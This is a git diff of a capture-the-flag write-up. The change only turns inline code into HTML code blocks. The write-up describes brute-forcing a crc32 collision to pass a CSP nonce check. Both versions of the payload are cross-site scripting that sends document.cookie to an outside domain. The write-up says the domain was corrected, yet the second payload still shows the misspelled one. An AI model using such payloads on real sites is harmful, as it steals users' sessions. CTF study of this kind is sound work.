@@ -127,12 +127,16 @@ This is just a crc32 hash collider written in go. It will start with a String an
 
 By running the code on 16 different laptops with 16 cores with 16 different nonces, we were able to collide it just in time.
 
-`<script nonce="e6377dcb">window.location="http://asol.space?x="+document.cookie</script>000000000000000000000000000000000048io`
+```html
+<script nonce="e6377dcb">window.location="http://asol.space?x="+document.cookie</script>000000000000000000000000000000000048io
+```
 
 But we made one mistake in the domain to which the flag is sent. Where the domain was supposed to be `https://axol.space` I put `https://asol.space` :sob:
 
 Now we had to put the correct domain and hash it again. This time it took even longer. It took so much time that we were just going to buy `https://asol.space`. But we collided that payload too and finally got the flag
 
-`<script nonce="e6377dcb">window.location="http://asol.space?x="+document.cookie</script>0000000000hytza`
+```html 
+<script nonce="e6377dcb">window.location="http://asol.space?x="+document.cookie</script>0000000000hytza
+```
 
 **Flag**: `dice{h0pe_that_d1dnt_take_too_l0ng}`
